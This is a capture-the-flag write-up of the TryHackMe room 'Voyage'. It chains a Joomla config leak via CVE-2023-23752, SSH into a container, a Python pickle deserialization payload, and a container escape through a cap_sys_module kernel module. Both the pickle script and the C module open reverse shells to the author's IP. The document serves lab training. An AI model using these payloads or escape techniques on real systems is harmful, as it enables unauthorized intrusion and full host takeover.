---
title: "TryHackMe: Voyage"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, joomla, cms, ssh, docker, container, port forwarding, insecure deserialization, container escape, sys_module, rce]
render_with_liquid: false
media_subpath: /images/tryhackme_voyage/
image:
  path: room_image.webp
---

**Voyage** started with exploiting a vulnerability in **Joomla! CMS** to leak its configuration and obtain a set of credentials, which we used with **SSH** to get a shell inside a container.

Using our access to this container to enumerate the internal network, we discovered another web application with an **insecure deserialization** vulnerability and exploited it to get a shell inside another container.

Lastly, abusing the **SYS_MODULE** capability granted to the container by installing a kernel module, we were able to obtain a shell on the host and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/voyage){: .center }

## Initial Enumeration

### Nmap Scan

We start with a **port scan**:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.235.70

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7b:58:ec:82:2f:ca:de:c9:e5:63:1d:fa:08:42:4b:78 (ECDSA)
|_  256 37:7f:17:6a:87:34:82:5f:97:92:59:0a:58:4b:09:82 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 16 disallowed entries (15 shown)
...
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:4a:7e:34:01:09:f8:68:d8:f7:dd:b8:57:d4:17:cf (RSA)
|   256 8d:cd:5e:60:35:c8:65:66:3a:c5:5c:2f:ac:62:93:80 (ECDSA)
|_  256 a9:d5:16:b1:5d:4a:4c:94:3f:fd:a9:68:5f:24:ee:79 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are three open ports:

* **22** (`SSH`)
* **80** (`HTTP`)
* **2222** (`SSH`)

### Web 80

Visiting `http://10.10.235.70/`, we see a simple page with a login form.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

Checking the source code for the page, we see that it uses **Joomla! CMS**.

![Web 80 Index Src](web_80_index_src.webp){: width="1200" height="600"}

Since it uses **Joomla!**, by making a request to the `/administrator/manifests/files/joomla.xml` endpoint, we can discover the version as `4.2.7`.

![Web 80 Joomla Version](web_80_joomla_version.webp){: width="1200" height="600"}

## Foothold

### CVE-2023-23752

Searching for vulnerabilities in **Joomla! v4.2.7**, we quickly discover the `CVE-2023-23752` vulnerability. This vulnerability allows us to bypass access checks on web service endpoints by simply including the GET parameter `public` and setting it to `true` in our request, like so: `?public=true`.

You can find a detailed examination of the vulnerability [here](https://www.vicarius.io/vsociety/posts/cve-2023-23752-joomla-unauthorized-access-vulnerability).

We can use this to make a request to the `/api/index.php/v1/config/application?public=true` endpoint to leak the configuration for **Joomla!**, which includes the database credentials.

![Web 80 Joomla Exploit](web_80_joomla_exploit.webp){: width="1200" height="600"}

We don't have access to the database as it is running on localhost; however, we can still try these credentials against the two **SSH** servers.

Trying them against the **SSH** server on port **22**, we see that we are not able to authenticate with a password.

```console
$ ssh root@10.10.235.70
root@10.10.235.70: Permission denied (publickey).
```

However, trying them against the **SSH** server on port **2222**, we see that password authentication is enabled and the credentials also work, giving us a shell as the **root** user inside a container.

```console
$ ssh root@10.10.235.70 -p 2222
root@10.10.235.70's password:
root@f5eb774507f2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## User Flag

### Enumerating Internal Network

Inside the container, we don't find anything useful. But checking the network configuration, we can see that it has the IP address **192.168.100.10** and is in the **192.168.100.0/24** network.

```console
root@f5eb774507f2:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:a8:64:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.100.10/24 brd 192.168.100.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**Nmap** is already available for us inside the container, so we can use it to scan the network for other hosts. Doing so, we can discover that apart from us and the host machine at `192.168.100.1`, there is another container running at `192.168.100.12`.

```console
root@f5eb774507f2:~# nmap -sn 192.168.100.0/24

Nmap scan report for ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1)
Host is up (0.000029s latency).
MAC Address: 02:42:D3:B6:9E:5E (Unknown)
Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
Host is up (0.000019s latency).
MAC Address: 02:42:C0:A8:64:0C (Unknown)
Nmap scan report for f5eb774507f2 (192.168.100.10)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.98 seconds
```

Once again using **nmap** to scan this container for open ports, we can discover port **5000** is open.

```console
root@f5eb774507f2:~# nmap -p- 192.168.100.12

Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
Host is up (0.0000070s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  upnp
MAC Address: 02:42:C0:A8:64:0C (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
```

Checking `192.168.100.12:5000`, we can see it is a webserver.

```console
root@f5eb774507f2:~# curl -s http://192.168.100.12:5000/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tourism Secret Finance Panel</title>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
</head>
<body style="background: linear-gradient(135deg, #e0f7fa, #80deea); min-height: 100vh;">
    <!-- Navbar -->
```

### Insecure Deserialization

We can use **SSH** to forward the port to access the web server directly, either by spawning the **SSH command line** with `~C` on our active session and running `-L 5000:192.168.100.12:5000`:

```console
root@f5eb774507f2:~# ~C
ssh> -L 5000:192.168.100.12:5000
Forwarding port.
```

> You might need to set `EnableEscapeCommandline=true` in your **SSH** configuration to enable the command line.
{: .prompt-tip }

or simply adding the `-L 5000:192.168.100.12:5000` argument to our initial **SSH** command:

```console
$ ssh root@10.10.235.70 -p 2222 -L 5000:192.168.100.12:5000
```

Either way, visiting `http://127.0.0.1:5000/` now gives us access to the web application at `192.168.100.12:5000`, where we see a login form.

![Web Ia 5000 Index](web_ia_5000_index.webp){: width="1200" height="600"}

Trying to log in with any credentials works, and we simply get a list of investments.

![Web Ia 5000 Login](web_ia_5000_login.webp){: width="1200" height="600"}

We don't see much on the website itself, but checking our login request in **Burp Suite**, we can see the server setting an interesting cookie called `session_data`.

![Web Ia 5000 Cookie Burp](web_ia_5000_cookie_burp.webp){: width="1000" height="500"}

Looking at the cookie value, we can quickly identify it as a **Python pickle serialized object** in hex as it starts with `8004` (pickle protocol version 4) and ends with a dot (`2e`). We can confirm this using **pickletools**:

```console
$ echo 80049525000000000000007d94288c0475736572948c0474657374948c07726576656e7565948c05383530303094752e | xxd -r -p > x.pickle

$ python3 -m pickletools x.pickle
    0: \x80 PROTO      4
    2: \x95 FRAME      37
   11: }    EMPTY_DICT
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE 'user'
   20: \x94     MEMOIZE    (as 1)
   21: \x8c     SHORT_BINUNICODE 'test'
   27: \x94     MEMOIZE    (as 2)
   28: \x8c     SHORT_BINUNICODE 'revenue'
   37: \x94     MEMOIZE    (as 3)
   38: \x8c     SHORT_BINUNICODE '85000'
   45: \x94     MEMOIZE    (as 4)
   46: u        SETITEMS   (MARK at 13)
   47: .    STOP
highest protocol among opcodes = 4
```
{: .wrap }

or simply by deserializing (unpickling) it ourselves:

```console
$ python3
Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> session_data = "80049525000000000000007d94288c0475736572948c0474657374948c07726576656e7565948c05383530303094752e"
>>> obj = pickle.loads(bytes.fromhex(session_data))
>>> print("Unpickled object:", obj)
Unpickled object: {'user': 'test', 'revenue': '85000'}
```

If in our subsequent requests the `session_data` cookie we have sent is not sanitized and used simply by deserializing it, we can use this to achieve **RCE** by creating a serialized object with a malicious `__reduce__` method that runs a reverse shell payload which gets executed when the object is being deserialized as such:

```py
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/10.14.101.76/443 0>&1'",))

malicious_pickle = pickle.dumps(Malicious())

print("Malicious pickle in hex:", malicious_pickle.hex())
```
{: file="payload.py"}

Now running the script to create our malicious pickled object payload:

```console
$ python3 payload.py
Malicious pickle in hex: 80049553000000000000008c05706f736978948c0673797374656d9493948c382f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f31302e31342e3130312e37362f34343320303e26312794859452942e
```

Sending our payload in the `session_data` cookie by making a request to the server, we can see the server hanging.

![Web Ia 5000 Cookie Payload Burp](web_ia_5000_cookie_payload_burp.webp){: width="1000" height="500"}

And on our listener, we get a shell as **root** in another container and can read the user flag at `/root/user.txt`:

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.235.70] 43662
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@d221f7bc7bf8:/finance-app# python3 -c 'import pty;pty.spawn("/bin/bash");'
root@d221f7bc7bf8:/finance-app# export TERM=xterm
root@d221f7bc7bf8:/finance-app# ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

root@d221f7bc7bf8:/finance-app# id
uid=0(root) gid=0(root) groups=0(root)
root@d221f7bc7bf8:/finance-app# wc -c /root/user.txt
38 /root/user.txt
```

## Root Flag

### Container Escape

Once again, we don't find anything useful inside the container; however, checking our capabilities, we can notice that we have the `cap_sys_module` capability set.

```console
root@d221f7bc7bf8:/tmp# capsh --print
Current: cap_chown,cap_dac_override,...,cap_sys_module,...
```
{: .wrap }

The **cap_sys_module** capability allows us to load kernel modules and since the container shares the kernel with the host, we can use this to execute code on the host. First, we create a basic kernel module that runs a reverse shell payload upon initialization:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int shell(void){
	char *argv[] ={"/bin/bash", "-c", "bash -i >& /dev/tcp/10.14.101.76/443 0>&1", NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int init_mod(void){
	return shell();
}

static void exit_mod(void){
	return;
}

module_init(init_mod);
module_exit(exit_mod);
```
{: file="shell.c" }

We also create a `Makefile` to compile it on the target:

```make
obj-m +=shell.o
all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules
clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
```
{: file="Makefile" }

Now we can use `make` to compile our module as `shell.ko`.

```console
root@d221f7bc7bf8:/tmp# ls
Makefile  shell.c
root@d221f7bc7bf8:/tmp# make
make -C /lib/modules/6.8.0-1030-aws/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-6.8.0-1030-aws'
warning: the compiler differs from the one used to build the kernel
  The kernel was built by: x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  You are using:           gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  CC [M]  /tmp/shell.o
  MODPOST /tmp/Module.symvers
  CC [M]  /tmp/shell.mod.o
  LD [M]  /tmp/shell.ko
  BTF [M] /tmp/shell.ko
Skipping BTF generation for /tmp/shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.8.0-1030-aws'
root@d221f7bc7bf8:/tmp# ls
Makefile  Module.symvers  modules.order  shell.c  shell.ko  shell.mod  shell.mod.c  shell.mod.o  shell.o
```

First, starting our listener:

```console
$ nc -lvnp 443
listening on [any] 443 ...
```

Now installing our module using `insmod`:

```console
root@d221f7bc7bf8:/tmp# insmod shell.ko
```

Going back to our listener, we can see a shell as `root` on the host and read the root flag at `/root/root.txt` to complete the room.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.235.70] 43688
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2404:/# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:/# wc -c /root/root.txt
38 /root/root.txt
```

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
